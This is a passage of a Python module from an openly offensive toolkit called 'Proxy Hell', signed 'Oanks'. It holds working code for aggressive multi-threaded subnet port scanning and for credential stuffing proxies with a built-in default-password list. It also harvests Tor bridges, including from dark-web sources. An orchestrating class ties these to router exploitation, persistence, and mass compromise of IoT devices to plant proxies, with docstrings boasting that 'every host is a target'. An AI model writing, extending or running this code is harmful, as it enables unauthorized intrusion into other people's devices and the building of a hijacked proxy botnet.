    Obfs4, snowflake, meek — every transport is a lifeline.
    We harvest them, test them, weaponize them.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._bridges = []
        self._harvest_stats = {
            "harvested": 0,
            "tested": 0,
            "working": 0,
            "failed": 0,
        }

    def harvest_from_tor_project(self) -> List[TorBridge]:
        """Harvest bridges from Tor Project bridge database."""
        bridges = []

        if not REQUESTS_AVAILABLE:
            return bridges

        try:
            # Request bridges via Tor Project API
            response = requests.post(
                "https://bridges.torproject.org/bridges?transport=obfs4",
                data={"captcha": "", "submit": "Get Bridges"},
                headers=STEALTH_HEADERS, timeout=30
            )

            if response.status_code == 200:
                # Parse bridge lines from HTML
                bridge_lines = re.findall(r'Bridge obfs4 \S+:\d+ \S+ cert=\S+ iat-mode=\d+', response.text)
                for line in bridge_lines:
                    parts = line.split()
                    if len(parts) >= 4:
                        addr = parts[2]
                        fingerprint = parts[3]
                        ip, port = addr.rsplit(":", 1)
                        cert_match = re.search(r'cert=(\S+)', line)
                        iat_match = re.search(r'iat-mode=(\d+)', line)
                        bridges.append(TorBridge(
                            fingerprint=fingerprint, ip=ip, port=int(port),
                            transport="obfs4", cert=cert_match.group(1) if cert_match else "",
                            iat_mode=iat_match.group(1) if iat_match else "0",
                            source="torproject"
                        ))
        except Exception as e:
            if self.logger:
                self.logger.error("TorBridgeHarvester", f"Tor Project harvest failed: {e}")

        return bridges

    def harvest_from_git(self) -> List[TorBridge]:
        """Harvest fallback directories from Tor git."""
        bridges = []

        if not REQUESTS_AVAILABLE:
            return bridges

        for url in TOR_BRIDGE_SOURCES[1:]:  # Skip the first one (web form)
            try:
                response = requests.get(url, headers=STEALTH_HEADERS, timeout=15)
                if response.status_code == 200:
                    # Parse fallback directory lines
                    lines = response.text.split("\n")
                    for line in lines:
                        if line.startswith("FallbackDir"):
                            # Extract ORAddress
                            oraddr_match = re.search(r'ORAddress (\S+):(\d+)', line)
                            if oraddr_match:
                                ip = oraddr_match.group(1)
                                port = int(oraddr_match.group(2))
                                fingerprint_match = re.search(r'id=(\S+)', line)
                                fingerprint = fingerprint_match.group(1) if fingerprint_match else ""
                                bridges.append(TorBridge(
                                    fingerprint=fingerprint, ip=ip, port=port,
                                    transport="orport", source="tor_git"
                                ))
            except Exception as e:
                if self.logger:
                    self.logger.error("TorBridgeHarvester", f"Git harvest failed: {e}")

        return bridges

    def harvest_from_darkweb(self) -> List[TorBridge]:
        """Harvest bridges from darkweb sources (requires Tor)."""
        bridges = []

        if not REQUESTS_AVAILABLE or not SOCKS_AVAILABLE:
            return bridges

        for onion_url in DARKWEB_SOURCES:
            try:
                proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
                response = requests.get(onion_url, proxies=proxies, 
                                       headers=STEALTH_HEADERS, timeout=30)
                if response.status_code == 200:
                    # Parse bridge lines
                    for line in response.text.split("\n"):
                        if line.startswith("Bridge "):
                            parts = line.split()
                            if len(parts) >= 4:
                                transport = parts[1]
                                addr = parts[2]
                                fingerprint = parts[3]
                                ip, port = addr.rsplit(":", 1)
                                cert_match = re.search(r'cert=(\S+)', line)
                                iat_match = re.search(r'iat-mode=(\d+)', line)
                                bridges.append(TorBridge(
                                    fingerprint=fingerprint, ip=ip, port=int(port),
                                    transport=transport, cert=cert_match.group(1) if cert_match else "",
                                    iat_mode=iat_match.group(1) if iat_match else "0",
                                    source="darkweb"
                                ))
            except Exception as e:
                if self.logger:
                    self.logger.error("TorBridgeHarvester", f"Darkweb harvest failed: {e}")

        return bridges

    def test_bridge(self, bridge: TorBridge, timeout: float = 15.0) -> TorBridge:
        """Test if a Tor bridge is working."""
        if not SOCKS_AVAILABLE:
            bridge.is_working = False
            return bridge

        try:
            import socket
            import socks as socks_lib

            original_socket = socket.socket
            s = socks_lib.socksocket()
            s.set_proxy(socks_lib.SOCKS5, bridge.ip, bridge.port)
            s.settimeout(timeout)

            start = time.time()
            s.connect(("check.torproject.org", 443))
            elapsed = (time.time() - start) * 1000

            s.close()
            socket.socket = original_socket

            bridge.is_working = True
            bridge.speed_ms = elapsed
            bridge.last_tested = datetime.datetime.utcnow().isoformat()
            bridge.reliability_score = 1.0

            self._harvest_stats["working"] += 1

        except Exception as e:
            bridge.is_working = False
            bridge.last_tested = datetime.datetime.utcnow().isoformat()
            self._harvest_stats["failed"] += 1
            try:
                socket.socket = original_socket
            except:
                pass

        self._harvest_stats["tested"] += 1
        return bridge

    def harvest_all(self) -> List[TorBridge]:
        """Harvest bridges from all sources."""
        all_bridges = []

        sources = [
            self.harvest_from_tor_project,
            self.harvest_from_git,
            self.harvest_from_darkweb,
        ]

        for source_func in sources:
            try:
                bridges = source_func()
                all_bridges.extend(bridges)
            except Exception as e:
                if self.logger:
                    self.logger.error("TorBridgeHarvester", f"Source failed: {e}")

        # Deduplicate
        seen = set()
        unique = []
        for b in all_bridges:
            key = (b.ip, b.port, b.transport)
            if key not in seen:
                seen.add(key)
                unique.append(b)

        self._harvest_stats["harvested"] += len(unique)
        self._bridges = unique

        if self.logger:
            self.logger.info("TorBridgeHarvester", f"Harvested {len(unique)} unique bridges")

        return unique

    def test_all_bridges(self, max_workers: int = 50) -> List[TorBridge]:
        """Test all harvested bridges in parallel."""
        tested = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_bridge, b): b for b in self._bridges}
            for future in as_completed(futures):
                try:
                    bridge = future.result(timeout=20)
                    tested.append(bridge)
                except:
                    pass

        self._bridges = tested
        working = [b for b in tested if b.is_working]

        if self.logger:
            self.logger.info("TorBridgeHarvester", 
                           f"Tested {len(tested)} bridges, {len(working)} working")

        return tested

    def get_working_bridges(self) -> List[TorBridge]:
        return [b for b in self._bridges if b.is_working]

    def export_bridges(self, filepath: str) -> str:
        with open(filepath, "w") as f:
            for b in self.get_working_bridges():
                f.write(b.to_bridge_line() + "\n")
        return filepath

    def get_stats(self) -> Dict[str, Any]:
        return dict(self._harvest_stats)


# ============================================================================
# SECTION 13: AGGRESSIVE SUBNET SCANNER — Masscan-Style Discovery.
# ============================================================================

class AggressiveSubnetScanner:
    """Aggressive subnet scanning for open proxy ports.

    Masscan-style speed. Multi-threaded SYN scanning.
    Every open port is a potential proxy. Every host is a target.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._scan_stats = {
            "hosts_scanned": 0,
            "ports_scanned": 0,
            "open_ports_found": 0,
            "proxies_discovered": 0,
        }

    def syn_scan_host(self, ip: str, ports: List[int] = None, 
                      timeout: float = 2.0) -> List[Dict[str, Any]]:
        """Fast SYN scan of a single host."""
        if ports is None:
            ports = COMMON_PROXY_PORTS

        open_ports = []

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    # Try to grab banner
                    banner = b""
                    try:
                        sock.settimeout(2)
                        banner = sock.recv(1024)
                    except:
                        pass

                    open_ports.append({
                        "ip": ip, "port": port,
                        "banner": banner.decode("utf-8", errors="ignore").strip(),
                        "timestamp": datetime.datetime.utcnow().isoformat()
                    })
                sock.close()
            except:
                pass

        return open_ports

    def scan_subnet_aggressive(self, subnet: str, ports: List[int] = None,
                                max_workers: int = 200, timeout: float = 2.0) -> List[Dict[str, Any]]:
        """Aggressive subnet scan. Hundreds of threads. Lightning fast."""
        if ports is None:
            ports = COMMON_PROXY_PORTS

        all_results = []

        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = list(network.hosts())
        except:
            return all_results

        if self.logger:
            self.logger.info("AggressiveSubnetScanner", 
                           f"Scanning {len(hosts)} hosts x {len(ports)} ports = {len(hosts)*len(ports)} combinations")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.syn_scan_host, str(ip), ports, timeout): ip for ip in hosts}
            for future in as_completed(futures):
                try:
                    results = future.result(timeout=timeout + 3)
                    all_results.extend(results)
                except:
                    pass

        self._scan_stats["hosts_scanned"] += len(hosts)
        self._scan_stats["ports_scanned"] += len(hosts) * len(ports)
        self._scan_stats["open_ports_found"] += len(all_results)

        if self.logger:
            self.logger.info("AggressiveSubnetScanner", 
                           f"Found {len(all_results)} open ports in {subnet}")

        return all_results

    def identify_proxy_type(self, result: Dict[str, Any]) -> Optional[str]:
        """Identify proxy type from banner and port."""
        banner = result.get("banner", "").lower()
        port = result.get("port", 0)

        if "squid" in banner or "squid" in result.get("headers", {}):
            return "http"
        if "tinyproxy" in banner:
            return "http"
        if "3proxy" in banner:
            return "http"
        if "privoxy" in banner:
            return "http"
        if "polipo" in banner:
            return "http"
        if "nginx" in banner and port in [8080, 8888, 3128]:
            return "http"
        if port == 9050:
            return "socks5"
        if port == 9150:
            return "socks5"
        if port == 1080:
            return "socks5"
        if port == 4145:
            return "socks4"
        if port in [8080, 3128, 8888, 8081, 9090]:
            return "http"
        if port in [1080, 1081]:
            return "socks5"

        return None

    def scan_and_harvest(self, subnets: List[str] = None, 
                         max_workers: int = 200) -> List[ProxyNode]:
        """Scan subnets and harvest proxies from open ports."""
        if subnets is None:
            subnets = AGGRESSIVE_SUBNET_TARGETS

        all_proxies = []

        for subnet in subnets:
            results = self.scan_subnet_aggressive(subnet, max_workers=max_workers)
            for result in results:
                protocol = self.identify_proxy_type(result)
                if protocol:
                    proxy = ProxyNode(
                        ip=result["ip"], port=result["port"], protocol=protocol,
                        source=f"aggressive_scan:{subnet}",
                        first_seen=datetime.datetime.utcnow().isoformat()
                    )
                    all_proxies.append(proxy)

        self._scan_stats["proxies_discovered"] += len(all_proxies)

        if self.logger:
            self.logger.info("AggressiveSubnetScanner", 
                           f"Harvested {len(all_proxies)} proxies from aggressive scan")

        return all_proxies

    def get_stats(self) -> Dict[str, Any]:
        return dict(self._scan_stats)


# ============================================================================
# SECTION 14: CREDENTIAL STUFFER — Harvested Creds Against Proxy Endpoints.
# ============================================================================

class CredentialStuffer:
    """Tests harvested credentials against proxy authentication endpoints.

    Every credential pair is a key. Every proxy endpoint is a lock.
    We try them all. Relentlessly. Efficiently. Dangerously.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self._lock = threading.RLock()
        self._credential_db = []
        self._stuff_stats = {
            "pairs_tested": 0,
            "valid_found": 0,
            "targets_tested": 0,
        }

    def load_credentials(self, filepath: str = None) -> List[CredentialPair]:
        """Load credentials from file or generate from common lists."""
        creds = []

        if filepath and os.path.exists(filepath):
            with open(filepath, "r") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        user, pwd = line.split(":", 1)
                        creds.append(CredentialPair(username=user, password=pwd, source=filepath))
        else:
            # Generate from common lists
            common_users = ["admin", "root", "user", "proxy", "test", "guest", "support"]
            common_passwords = [
                "admin", "password", "123456", "1234", "12345", "root", "toor",
                "password123", "admin123", "user123", "proxy", "test", "guest",
                "12345678", "123456789", "qwerty", "abc123", "letmein", "welcome",
                "monkey", "dragon", "master", "shadow", "sunshine", "princess",
                "football", "baseball", "iloveyou", "trustno1", "abc123", "welcome1",
            ]
            for user in common_users:
                for pwd in common_passwords:
                    creds.append(CredentialPair(username=user, password=pwd, source="generated"))

        self._credential_db = creds
        return creds

    def test_proxy_auth(self, proxy: ProxyNode, cred: CredentialPair,
                        timeout: float = 10.0) -> bool:
        """Test if credentials work against a proxy."""
        if not REQUESTS_AVAILABLE:
            return False

        try:
            proxy_url = f"{proxy.protocol}://{cred.username}:{cred.password}@{proxy.ip}:{proxy.port}"
            proxies = {"http": proxy_url, "https": proxy_url}

            response = requests.get("http://httpbin.org/ip", proxies=proxies,
                                   timeout=timeout, headers=STEALTH_HEADERS)

            if response.status_code == 200:
                cred.is_valid = True
                cred.target_ip = proxy.ip
                cred.target_port = proxy.port
                cred.target_type = "proxy"
                cred.last_tested = datetime.datetime.utcnow().isoformat()
                cred.success_count += 1
                return True
            else:
                cred.failure_count += 1

        except:
            cred.failure_count += 1

        return False

    def stuff_proxy(self, proxy: ProxyNode, creds: List[CredentialPair] = None,
                    max_workers: int = 20) -> List[CredentialPair]:
        """Try all credentials against a single proxy."""
        if creds is None:
            creds = self._credential_db

        valid = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy_auth, proxy, cred): cred for cred in creds}
            for future in as_completed(futures):
                cred = futures[future]
                try:
                    if future.result(timeout=15):
                        valid.append(cred)
                        proxy.credentials = (cred.username, cred.password)
                except:
                    pass
                self._stuff_stats["pairs_tested"] += 1

        self._stuff_stats["targets_tested"] += 1
        self._stuff_stats["valid_found"] += len(valid)

        if self.logger and valid:
            self.logger.info("CredentialStuffer", 
                           f"Found {len(valid)} valid creds for {proxy.get_address()}")

        return valid

    def mass_stuff(self, proxies: List[ProxyNode], 
                   creds: List[CredentialPair] = None,
                   max_workers: int = 50) -> Dict[str, List[CredentialPair]]:
        """Mass credential stuffing against all proxies."""
        if creds is None:
            creds = self._credential_db

        results = {}

        def stuff_single(proxy):
            valid = self.stuff_proxy(proxy, creds, max_workers=10)
            if valid:
                results[proxy.get_address()] = valid

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(stuff_single, p) for p in proxies]
            for future in as_completed(futures):
                try:
                    future.result(timeout=60)
                except:
                    pass

        if self.logger:
            self.logger.info("CredentialStuffer", 
                           f"Mass stuff: {len(results)} proxies compromised")

        return results

    def get_stats(self) -> Dict[str, Any]:
        return dict(self._stuff_stats)



# ============================================================================
# SECTION 15: PROXY HELL CORE — Unified Interface. The Heartbeat of Phase 2.
# ============================================================================

class ProxyHellCore:
    """Unified core interface for Phase 2: Proxy Hell.

    Coordinates all Phase 2 subsystems:
    - ProxyScraper (50+ sources, continuous scraping)
    - ProxyValidator (500 concurrent threads, behavioral analysis)
    - ProxyManager (pool, rotation, chains, self-healing)
    - ProxyRouter (router exploitation, proxy deployment)
    - IoTProxyDeployer (IoT device compromise, proxy installation)
    - TorBridgeHarvester (bridge harvesting, testing)
    - AggressiveSubnetScanner (masscan-style discovery)
    - CredentialStuffer (credential stuffing against proxies)

    Usage:
        core = ProxyHellCore(master_key="your_super_secret_key")
        core.initialize()
        core.start_all()

        # Get best proxies
        proxies = core.get_best_proxies(10)

        # Create a proxy chain
        chain = core.create_proxy_chain(length=5, tor_wrapped=True)

        # Exploit routers
        routers = core.exploit_routers(subnets=["192.168.1.0/24"])

        # Deploy IoT proxies
        iot = core.deploy_iot_proxies(subnets=["192.168.1.0/24"])

        # Harvest Tor bridges
        bridges = core.harvest_tor_bridges()
    """

    __slots__ = ("_master_key", "_derived_keys", "_crypto", "_db", "_logger",
                 "_scraper", "_validator", "_manager", "_router", "_iot",
                 "_tor_harvester", "_subnet_scanner", "_cred_stuffer",
                 "_initialized", "_running", "_lock", "_auto_threads",
                 "_stats")

    def __init__(self, master_key: str, db_manager=None, crypto_engine=None, logger=None):
        self._master_key = master_key
        self._derived_keys = None
        self._crypto = crypto_engine
        self._db = db_manager
        self._logger = logger
        self._scraper = None
        self._validator = None
        self._manager = None
        self._router = None
        self._iot = None
        self._tor_harvester = None
        self._subnet_scanner = None
        self._cred_stuffer = None
        self._initialized = False
        self._running = False
        self._lock = threading.RLock()
        self._auto_threads = []
        self._stats = {
            "initialization_time": "",
            "total_proxies_scraped": 0,
            "total_proxies_validated": 0,
            "total_proxies_alive": 0,
            "total_chains_created": 0,
            "total_routers_exploited": 0,
            "total_iot_deployed": 0,
            "total_tor_bridges": 0,
            "total_subnets_scanned": 0,
            "total_creds_stuffed": 0,
        }

    def initialize(self) -> bool:
        """Initialize all Phase 2 subsystems."""
        with self._lock:
            if self._initialized:
                return True

            start_time = time.time()

            # Derive keys if crypto not provided
            if self._crypto is None:
                self._derived_keys = derive_keys_from_master(self._master_key)
                # Note: In real usage, import CryptoEngine from Phase 1
                # self._crypto = CryptoEngine(self._derived_keys)

            # Ensure directories
            ensure_directories()

            # Initialize subsystems
            self._scraper = ProxyScraper(self._db, self._crypto, self._logger)
            self._validator = ProxyValidator(self._db, self._crypto, self._logger)
            self._manager = ProxyManager(self._db, self._crypto, self._logger)
            self._router = ProxyRouter(self._db, self._crypto, self._logger)
            self._iot = IoTProxyDeployer(self._db, self._crypto, self._logger)
            self._tor_harvester = TorBridgeHarvester(self._db, self._crypto, self._logger)
            self._subnet_scanner = AggressiveSubnetScanner(self._db, self._crypto, self._logger)
            self._cred_stuffer = CredentialStuffer(self._db, self._crypto, self._logger)

            # Load credentials
            self._cred_stuffer.load_credentials()

            self._stats["initialization_time"] = datetime.datetime.utcnow().isoformat()
            self._initialized = True

            elapsed = time.time() - start_time

            if self._logger:
                self._logger.info("ProxyHellCore", BRAND_WELCOME)
                self._logger.info("ProxyHellCore", f"Phase 2 initialized in {elapsed:.2f}s")

            return True

    def start_all(self) -> bool:
        """Start all background services."""
        with self._lock:
            if not self._initialized:
                raise ProxyError("Core not initialized. Call initialize() first.", code="CORE_NOT_INIT")

            # Start continuous scraping
            self._scraper.start_continuous_scraping()

            # Start continuous validation
            self._validator.start_continuous_validation(self._manager)

            # Start continuous router scanning
            if PROXY_ROUTER_EXPLOIT_ENABLED:
                self._router.start_continuous_scanning()

            self._running = True

            if self._logger:
                self._logger.info("ProxyHellCore", "All Phase 2 services operational")

            return True

    def stop_all(self) -> bool:
        """Stop all background services."""
        with self._lock:
            self._scraper.stop_continuous_scraping()
            self._validator.stop_continuous_validation()
            self._router.stop_continuous_scanning()
            self._running = False

            if self._logger:
                self._logger.info("ProxyHellCore", "All Phase 2 services stopped")

            return True

    # ========================================================================
    # PROXY OPERATIONS
    # ========================================================================

    def scrape_all_proxies(self) -> List[ProxyNode]:
        """Scrape all 50+ sources immediately."""
        proxies = self._scraper.scrape_all_sources()
        self._stats["total_proxies_scraped"] += len(proxies)
        return proxies

    def validate_proxies(self, proxies: List[ProxyNode] = None) -> List[ProxyNode]:
        """Validate proxies. If none provided, validates all in pool."""
        if proxies is None:
            proxies = self._manager.get_all_proxies()
        validated = self._validator.validate_proxies_parallel(proxies)
        self._manager.update_proxies(validated)
        alive = [p for p in validated if p.is_alive]
        self._stats["total_proxies_validated"] += len(validated)
        self._stats["total_proxies_alive"] = len(alive)
        return validated

    def get_best_proxies(self, count: int = 10, **filters) -> List[ProxyNode]:
        """Get the best proxies by reliability and speed."""
        return self._manager.get_best_proxies(count, **filters)

    def get_proxies_by_country(self, country: str) -> List[ProxyNode]:
        return self._manager.get_proxies_by_country(country)

    def get_proxies_by_protocol(self, protocol: str) -> List[ProxyNode]:
        return self._manager.get_proxies_by_protocol(protocol)

    def get_elite_proxies(self) -> List[ProxyNode]:
        return self._manager.get_elite_proxies()

    def get_healthy_proxies(self) -> List[ProxyNode]:
        return self._manager.get_healthy_proxies()

    def add_proxy(self, proxy: ProxyNode) -> bool:
        return self._manager.add_proxy(proxy)

    def remove_proxy(self, ip: str, port: int, protocol: str) -> bool:
        return self._manager.remove_proxy(ip, port, protocol)

    def cleanup_dead_proxies(self) -> int:
        return self._manager.cleanup()

    # ========================================================================
    # PROXY CHAIN OPERATIONS
    # ========================================================================

    def create_proxy_chain(self, length: int = 3, country_path: List[str] = None,
                           protocol: str = None, tor_wrapped: bool = False,
                           sticky: bool = False) -> ProxyChain:
        chain = self._manager.create_chain(length=length, country_path=country_path,
                                           protocol=protocol, tor_wrapped=tor_wrapped,
                                           sticky=sticky)
        self._stats["total_chains_created"] += 1
        return chain

    def get_chain(self, chain_id: str) -> Optional[ProxyChain]:
        return self._manager.get_chain(chain_id)

    def rotate_chain(self, chain_id: str) -> Optional[ProxyNode]:
        return self._manager.rotate_chain(chain_id)

    def self_heal_chain(self, chain_id: str) -> bool:
        return self._manager.self_heal_chain(chain_id)

    def destroy_chain(self, chain_id: str) -> bool:
        return self._manager.destroy_chain(chain_id)

    def create_sticky_session(self, length: int = 3, **kwargs) -> str:
        return self._manager.create_sticky_session(length=length, **kwargs)

    def get_sticky_session(self, session_id: str) -> Optional[ProxyChain]:
        return self._manager.get_sticky_session(session_id)

    def get_country_chain(self, countries: List[str], **kwargs) -> ProxyChain:
        return self._manager.get_country_chain(countries, **kwargs)

    # ========================================================================
    # ROUTER EXPLOITATION
    # ========================================================================

    def scan_routers(self, subnet: str, **kwargs) -> List[RouterTarget]:
        return self._router.scan_subnet(subnet, **kwargs)

    def scan_all_routers(self, subnets: List[str] = None, **kwargs) -> List[RouterTarget]:
        return self._router.scan_all_subnets(subnets, **kwargs)

    def identify_router(self, target: RouterTarget) -> RouterTarget:
        return self._router.identify_router(target)

    def bruteforce_router(self, target: RouterTarget, **kwargs) -> RouterTarget:
        return self._router.bruteforce_router(target, **kwargs)

    def exploit_router(self, target: RouterTarget, cve_id: str = None,
                       payload_url: str = None) -> Dict[str, Any]:
        return self._router.exploit_router(target, cve_id, payload_url)

    def deploy_proxy_on_router(self, target: RouterTarget, **kwargs) -> Dict[str, Any]:
        return self._router.deploy_proxy_on_router(target, **kwargs)

    def persist_on_router(self, target: RouterTarget) -> bool:
        return self._router.persist_on_router(target)

    def mass_exploit_routers(self, targets: List[RouterTarget], 
                              payload_url: str = None) -> Dict[str, Any]:
        result = self._router.mass_exploit(targets, payload_url)
        self._stats["total_routers_exploited"] += result.get("successful", 0)
        return result

    def exploit_routers(self, subnets: List[str] = None, **kwargs) -> Dict[str, Any]:
        """Full pipeline: scan -> identify -> brute-force -> exploit -> deploy."""
        targets = self.scan_all_routers(subnets, **kwargs)

        # Identify all
        for target in targets:
            self.identify_router(target)

        # Brute-force vulnerable ones
        for target in targets:
            if target.is_exploitable:
                self.bruteforce_router(target)

        # Exploit and deploy
        result = self.mass_exploit_routers(targets)

        # Add deployed proxies to pool
        for target in targets:
            if target.proxy_deployed:
                proxy = ProxyNode(
                    ip=target.ip, port=target.proxy_port, protocol="socks5",
                    is_router=True, source=f"router_exploit:{target.vendor}",
                    first_seen=datetime.datetime.utcnow().isoformat()
                )
                self.add_proxy(proxy)

        return result

    def get_router_db(self) -> Dict[str, RouterTarget]:
        return self._router.get_router_db()

    # ========================================================================
    # IOT PROXY DEPLOYMENT
    # ========================================================================

    def scan_iot_devices(self, subnet: str, **kwargs) -> List[IoTDevice]:
        return self._iot.scan_for_iot(subnet, **kwargs)

    def compromise_iot_device(self, device: IoTDevice, **kwargs) -> IoTDevice:
        return self._iot.compromise_device(device, **kwargs)

    def deploy_iot_proxy(self, device: IoTDevice, **kwargs) -> Dict[str, Any]:
        return self._iot.deploy_proxy_on_iot(device, **kwargs)

    def mass_compromise_iot(self, subnet: str, **kwargs) -> List[IoTDevice]:
        devices = self._iot.mass_compromise(subnet, **kwargs)
        self._stats["total_iot_deployed"] += len(devices)

        # Add deployed proxies to pool
        for device in devices:
            if device.proxy_deployed:
                proxy = ProxyNode(
                    ip=device.ip, port=device.proxy_port, protocol=device.proxy_protocol,
                    is_iot=True, source=f"iot:{device.device_type}",
                    first_seen=datetime.datetime.utcnow().isoformat()
                )
                self.add_proxy(proxy)

        return devices

    def deploy_iot_proxies(self, subnets: List[str] = None, **kwargs) -> List[IoTDevice]:
        """Full pipeline: scan -> compromise -> deploy on all subnets."""
        if subnets is None:
            subnets = AGGRESSIVE_SUBNET_TARGETS[:3]

        all_devices = []
        for subnet in subnets:
            devices = self.mass_compromise_iot(subnet, **kwargs)
            all_devices.extend(devices)

        return all_devices

    def get_iot_db(self) -> Dict[str, IoTDevice]:
        return self._iot.get_iot_db()

    # ========================================================================
    # TOR BRIDGE OPERATIONS
    # ========================================================================

    def harvest_tor_bridges(self) -> List[TorBridge]:
        bridges = self._tor_harvester.harvest_all()
        self._stats["total_tor_bridges"] += len(bridges)
        return bridges

    def test_tor_bridges(self) -> List[TorBridge]:
        return self._tor_harvester.test_all_bridges()

    def get_working_bridges(self) -> List[TorBridge]:
        return self._tor_harvester.get_working_bridges()

    def export_bridges(self, filepath: str = None) -> str:
        if filepath is None:
            filepath = TOR_BRIDGE_PATH
        return self._tor_harvester.export_bridges(filepath)

    # ========================================================================
    # AGGRESSIVE SUBNET SCANNING
    # ========================================================================

    def aggressive_scan(self, subnets: List[str] = None, **kwargs) -> List[ProxyNode]:
        proxies = self._subnet_scanner.scan_and_harvest(subnets, **kwargs)
        self._stats["total_subnets_scanned"] += len(subnets or [])

        # Validate and add to pool
        validated = self.validate_proxies(proxies)
        for p in validated:
            if p.is_alive:
                self.add_proxy(p)

        return validated

    def syn_scan(self, subnet: str, **kwargs) -> List[Dict[str, Any]]:
        return self._subnet_scanner.scan_subnet_aggressive(subnet, **kwargs)

    # ========================================================================
    # CREDENTIAL STUFFING
    # ========================================================================

    def load_credentials(self, filepath: str = None) -> List[CredentialPair]:
        return self._cred_stuffer.load_credentials(filepath)

    def stuff_proxy(self, proxy: ProxyNode, **kwargs) -> List[CredentialPair]:
        return self._cred_stuffer.stuff_proxy(proxy, **kwargs)

    def mass_stuff(self, proxies: List[ProxyNode] = None, **kwargs) -> Dict[str, List[CredentialPair]]:
        if proxies is None:
            proxies = self.get_healthy_proxies()
        result = self._cred_stuffer.mass_stuff(proxies, **kwargs)
        self._stats["total_creds_stuffed"] += sum(len(v) for v in result.values())
        return result

    # ========================================================================
    # EXPORT / IMPORT
    # ========================================================================

    def export_proxies(self, filepath: str = None, format: str = "json") -> str:
        if filepath is None:
            ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(EXPORT_DIR, f"proxies_{ts}.{format}")
        return self._manager.export_proxies(filepath, format)

    def import_proxies(self, filepath: str, format: str = "auto") -> int:
        return self._manager.import_proxies(filepath, format)

    # ========================================================================
    # STATISTICS & STATUS
    # ========================================================================

    def get_stats(self) -> Dict[str, Any]:
        stats = dict(self._stats)
        stats.update({
            "scraper": self._scraper.get_source_stats() if self._scraper else {},
            "validator": self._validator.get_stats() if self._validator else {},
            "manager": self._manager.get_stats() if self._manager else {},
            "router": self._router.get_stats() if self._router else {},
            "iot": self._iot.get_stats() if self._iot else {},
            "tor": self._tor_harvester.get_stats() if self._tor_harvester else {},
            "subnet_scanner": self._subnet_scanner.get_stats() if self._subnet_scanner else {},
            "cred_stuffer": self._cred_stuffer.get_stats() if self._cred_stuffer else {},
            "initialized": self._initialized,
            "running": self._running,
            "oanks_tag": OANKS_SIGNATURE,
            "version": OANKS_VERSION,
            "phase": "Proxy Hell",
        })
        return stats

    def status(self) -> Dict[str, Any]:
        return self.get_stats()

    def full_report(self) -> Dict[str, Any]:
        """Generate a comprehensive report of all Phase 2 operations."""
        return {
            "phase": "Proxy Hell",
            "version": OANKS_VERSION,
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "stats": self.get_stats(),
            "proxy_pool": {
                "total": len(self._manager.get_all_proxies()) if self._manager else 0,
                "healthy": len(self._manager.get_healthy_proxies()) if self._manager else 0,
                "elite": len(self._manager.get_elite_proxies()) if self._manager else 0,
                "by_country": self._get_proxy_countries(),
                "by_protocol": self._get_proxy_protocols(),
            },
            "chains": list(self._manager._chains.keys()) if self._manager else [],
            "routers": len(self._router.get_router_db()) if self._router else 0,
            "iot_devices": len(self._iot.get_iot_db()) if self._iot else 0,
            "tor_bridges": len(self._tor_harvester.get_working_bridges()) if self._tor_harvester else 0,
            "oanks_tag": OANKS_SIGNATURE,
        }

    def _get_proxy_countries(self) -> Dict[str, int]:
        if not self._manager:
            return {}
        countries = {}
        for p in self._manager.get_all_proxies():
            c = p.country or "Unknown"
            countries[c] = countries.get(c, 0) + 1
        return countries

    def _get_proxy_protocols(self) -> Dict[str, int]:
        if not self._manager:
            return {}
        protocols = {}
        for p in self._manager.get_all_proxies():
            protocols[p.protocol] = protocols.get(p.protocol, 0) + 1
        return protocols

    def shutdown(self):
        """Graceful shutdown of all Phase 2 services."""
        self.stop_all()
        if self._logger:
            self._logger.info("ProxyHellCore", "Phase 2 shutdown complete")


# ============================================================================
# SECTION 16: CONVENIENCE FUNCTIONS — Quick access, no class needed.
# ============================================================================

def scrape_all_proxies(master_key: str = None, **kwargs) -> List[ProxyNode]:
    """Quick function to scrape all proxies."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.scrape_all_proxies()

def validate_proxies(proxies: List[ProxyNode], master_key: str = None, **kwargs) -> List[ProxyNode]:
    """Quick function to validate proxies."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.validate_proxies(proxies)

def create_proxy_chain(length: int = 3, master_key: str = None, **kwargs) -> ProxyChain:
    """Quick function to create a proxy chain."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.create_proxy_chain(length=length, **kwargs)

def exploit_routers(subnets: List[str], master_key: str = None, **kwargs) -> Dict[str, Any]:
    """Quick function to exploit routers."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.exploit_routers(subnets, **kwargs)

def deploy_iot_proxies(subnets: List[str], master_key: str = None, **kwargs) -> List[IoTDevice]:
    """Quick function to deploy IoT proxies."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.deploy_iot_proxies(subnets, **kwargs)

def harvest_tor_bridges(master_key: str = None, **kwargs) -> List[TorBridge]:
    """Quick function to harvest Tor bridges."""
    core = ProxyHellCore(master_key or "default_key")
    core.initialize()
    return core.harvest_tor_bridges()


# ============================================================================
# END OF PHASE 2 — PROXY HELL
# ============================================================================
# All definitions complete. No execution. Import only.
# Phase 3-12 will import from this module.
#
# 👑 Oanks — Creator
# ============================================================================
